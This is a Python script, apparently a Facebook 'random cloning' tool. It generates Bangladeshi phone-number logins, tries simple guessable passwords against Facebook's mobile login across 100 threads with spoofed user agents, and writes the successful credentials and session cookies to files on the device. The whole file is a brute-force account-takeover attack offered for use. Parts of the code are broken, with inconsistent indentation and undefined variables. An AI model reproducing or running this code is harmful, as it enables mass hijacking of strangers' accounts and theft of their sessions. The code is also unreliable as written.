import os,sys,time,json,random,re,string,platform,base64,uuid
from bs4 import BeautifulSoup as sop
from bs4 import BeautifulSoup
import requests as ress
from datetime import date
from datetime import datetime
from time import sleep
from os import system as s
from time import sleep as waktu
try:
    import requests
    from concurrent.futures import ThreadPoolExecutor as ThreadPool
    import mechanize
    from requests.exceptions import ConnectionError
except ModuleNotFoundError:
    os.system('pip install mechanize requests futures bs4==2 > /dev/null')
    os.system('pip install bs4')
loop = 0
oks = []
cps = []
ugen2=[]
ugen=[]
cokbrut=[]
ses=requests.Session()
ugen=[]
uas=[]
for ua in range(5000):
      a='Mozilla/5.0 (Linux; Android'
      b=random.choice(['5.1.1' , '6.0.1' , '7.1.1' , '12' , '13' , '14' , '15'])
      y=random.choice(['SM-J320H' , 'SM-J3109' , 'J320FN' , 'SM-J320P' , 'SM-J320F' , 'SM-J320G' , 'SM-J320Y'])
      c='Build/LMY47X; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/'
      d=random.randrange(40,115)
      e='0'
      f=random.randrange(3000,6000)
      g=random.randrange(20,100)
      h='Mobile Safari/537.36'
      ug=(f"{a} {b}; {y} {c}{d}.{e}.{f}.{g} {h}")
      ugen.append(ug)
for ua in range(5000):
    a='NokiaX'
    b=random.randrange(1,9)
    c='-0'
    d=random.randrange(1,9)
    e='/'
    f=random.randrange(1,9)
    g='.0 ('
    h=random.randrange(1,12)
    i='Profile/MIDP-2.1 Configuration/CLDC-1.1'
    j='UNTRUSTED/'
    k=random.randrange(1,3)
    l='.0'
    uaku2=f'{a}{b}{c}{d}{e}{f}{g}{h}{i}{j}{k}{l}'
    ugen.append(uaku2)
logo =(f"""
\033[1;92m d888888b  .d8b.  d8888b. d88888b db   dD 
\033[1;92m `~~88~~' d8' `8b 88  `8D 88'     88 ,8P' 
  \033[1;92m  88    88ooo88 88oobY' 88ooooo 88,8P   
  \033[1;92m  88    88~~~88 88`8b   88~~~~~ 88`8b   
   \033[1;92m 88    88   88 88 `88. 88.     88 `88. 
   \033[1;92m YP    YP   YP 88   YD Y88888P YP   YD 
\33[1;92m ╔━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╗
\33[1;92m ║\033[1;91m[\033[1;92m✔︎\033[1;91m]\033[1;97m AUTHOR  \033[1;91m : \033[1;92mMD TAREK HOSSEN\33[1;92m              ║
\33[1;92m ║\033[1;91m[\033[1;92m✔︎\033[1;91m]\033[1;97m FACEBOOK\033[1;91m : \033[1;92mMD TAREK HOSSEN           \33[1;92m   ║
\33[1;92m ║\033[1;91m[\033[1;92m✔︎\033[1;91m]\033[1;97m GITHUB  \033[1;91m : \033[1;92mMR-TAREK-143                \33[1;92m ║
\33[1;92m ║\033[1;91m[\033[1;92m✔︎\033[1;91m]\033[1;97m TOOLS   \033[1;91m : \x1b[97m\033[37;41m RANDOM \033[0;m  \033[1;91m[FREE\033[1;91m] \33[1;92m            ║
\33[1;92m ╚━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╝""")
A = '\x1b[1;97m' 
B = '\x1b[1;96m' 
C = '\x1b[1;91m' 
D = '\033[38;5;46m'
M = '\033[1;31m'
H = '\033[38;5;46m'
N = '\x1b[1;37m'    
E = '\x1b[1;93m' 
F = '\x1b[1;94m'
G = '\x1b[1;95m'
P = '\033[1;37m'
def Main():
	os.system('clear')
	print(logo)
	print("  \033[1;91m[\033[1;92mA\33[1;92m\033[1;91m] \033[1;92mSTART RANDOM CLONING")
	print("  \033[1;91m[\033[1;92mB\33[1;92m\033[1;91m] \033[1;92mJOIN MY FACEBOOK GROUP")
	print("  \033[1;91m[\033[1;92mD\33[1;92m\033[1;91m] \033[1;92mMY WHATSAPP")
	print(50*'━')
	opt = input('  Choose option\033[1;91m :\033[1;92m ')
	if opt in ["A","1"]:
		TAREK()
	if opt in ["B","2"]:
		os.system(f'xdg-open https://facebook.com/groups/1191593692246458/');time.sleep(1)
		admin()
	if opt in ["C","4"]:
		os.system('xdg-open https://wa.me/+8801853837529');time.sleep(1)
		group()
		
	else:
		print('\n\033[1;92mChoose valid option\033[0;97m');time.sleep(1)
		Main()
def admin():
	os.system('clear')
	print(logo)
	print(50*'_')
	print('\033[1;91m[\033[1;92m1\33[1;92m\033[1;91m] \033[1;92mContract WhatsApp ')
	print('\033[1;91m[\033[1;92m2\33[1;92m\033[1;91m] \033[1;92mJOIN MY FACEBOOK GROUP')
	print(' [0] Back to Main menu')
	bal = input('Choose option\033[1;91m :\033[1;92m')
	if bal =='1':
		os.system('xdg-open https://wa.me/+8801853837529');time.sleep(1)
		admin()
	if bal =='2':
		os.system('xdg-open https://facebook.com/groups/1191593692246458/');time.sleep(1)
		admin()
	if bal =='0':
		Main()
		
def TAREK():
	user=[]
	os.system('clear')
	print(logo)
	print(" \033[1;91m[\033[1;92m=\033[1;91m] \033[1;92mBD SIM CODE \033[1;91m:\033[1;92m 017 015 018 019 013 015 016]")
	kode = input(' \033[1;91m[\033[1;92m?\033[1;91m] \033[1;92mSELECT\033[1;91m : \033[1;92m')
	doamin = ' BD Number id cloner [ONLY-OK] '
	print(' \033[1;91m[\033[1;92m=\033[1;91m] \033[1;92mEXAMPLE \033[1;91m:\033[1;92m 1000,5000,10000,15000,20000] ')
    limit = int(input(' \033[1;91m[\033[1;92m?\033[1;91m] \033[1;92mLIMIT \033[1;91m : \033[1;92m '))
    for nmbr in range(limit):
        nmp = ''.join(random.choice(string.digits) for _ in range(4))
        user.append(nmp)
    with ThreadPool(max_workers=100) as JABER:
        os.system('clear')
        print(logo)
        tl = str(len(user))
        print('\033[1;32m='*50)
        print('\033[1;31m[\033[1;96m•\033[1;31m] \033[1;32mSIM CODE : '+nude)
        print('\033[1;31m[\033[1;96m•\033[1;31m] \033[1;33mTOTAL IDS : \033[1;92m'+tl)
        print(f"\033[1;31m[\033[1;96m•\033[1;31m] \033[1;32m[ON-OFF] AEROPLANE MODE ")
        print('\033[1;32m='*50)
        for guru in user:
            uid = nude+nudex+nud+guru
            pwx = [nude+nudex+nud+guru,nud+guru,nudex+guru,nude+nudex+nud,'bangla']
            JABER.submit(rcrack,uid,pwx,tl)
    print ('\033[1;31m==================================================           ')
    print('\033[1;37m[\033[1;32m~\033[1;37m] CRACK SUCCESSFULLY COMPLETED..')
    print ('\033[1;31m==================================================           ')
def rcrack(uid,pwx,tl):
    global loop
    global cps
    global oks
    global proxy
    try:
        for ps in pwx:
            pro = random.choice(ugen)
            session = requests.Session()
            bi = random.choice([A,B,C,D,E,F,G,H])
            sys.stdout.write(f'\r \033[1;31m[%sTT-KING\033[1;31m]\033[1;34m\033[1;31m[\033[38;5;195m%s/%s\033[1;31m]\033[1;34m\033[38;5;45mOK-\033[38;5;46m%s\r'%(bi,loop,tl,len(oks))),
            sys.stdout.flush()
            free_fb = session.get('https://d.facebook.com').text
            log_data = {
                "lsd":re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
            "jazoest":re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
            "m_ts":re.search('name="m_ts" value="(.*?)"', str(free_fb)).group(1),
            "li":re.search('name="li" value="(.*?)"', str(free_fb)).group(1),
            "try_number":"0",
            "unrecognized_tries":"0",
            "email":uid,
            "pass":ps,
            "login":"Log In"}
            header_freefb = {
            'authority': 'd.facebook.com',
            'method': 'GET',
            'scheme': 'https',
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
            'accept-language': 'en-US,en;q=0.9',
            'cache-control': 'max-age=0',
            'dpr': '2.0562500953674316',
            'sec-ch-prefers-color-scheme': 'light',
            'sec-ch-ua': '"(Not(A:Brand";v="99", "Chromium";v="116", "Google Chrome";v="116"',
            'sec-ch-ua-full-version-list': '"(Not(A:Brand";v="99.0.0.0", "Chromium";v="116.0.5738.214", "Google Chrome";v="116.0.5738.214"',
            'sec-ch-ua-mobile': '?1',
            'sec-ch-ua-model': '"220333QAG"',
            'sec-ch-ua-platform': '"Android"',
            'sec-ch-ua-platform-version': '""',
            'sec-fetch-dest': 'document',
            'sec-fetch-mode': 'navigate',
            'sec-fetch-site': 'none',
            'sec-fetch-user': '?1',
            'upgrade-insecure-requests': '1',
            'user-agent': 'Mozilla/5.0 (Linux; Android 11; SM-T590) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5738.214 Mobile Safari/537.36',
            'viewport-width': '980',}
            lo = session.post('https://d.facebook.com/login/device-based/login/async/?refsrc=deprecated&lwv=100',data=log_data,headers=header_freefb).text
            log_cookies=session.cookies.get_dict().keys()
            if 'c_user' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[65:80]
                print(f"\033[1;33m[TAREK-💚] {uid} • {ps}" '  \n\033[1;33m [🥰]\033[1;33mCookie = \033[1;32m'+coki+  ' \n\033[1;33m [🥰] \033[1;32mUa = \033[1;34m'+pro+'  \033[0;97m')
                open('/sdcard/MR-TAREK-OK.txt', 'a').write( uid+' | '+ps+'\n')
                oks.append(uid)
                break
            elif 'checkpoint' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[82:97]
                #print(f"\033[1;32m[TAREK-CP😔] \033[1;31m{uid} • {ps}")
                #os.system("espeak \"TAREK, CP, ID \"")
                open('/sdcard/TAREK-CP😔.txt', 'a').write( uid+' | '+ps+' \n')
                cps.append(uid)
                break
            else:
                continue
        loop+=1
        
    except:
        pass
        
TAREK()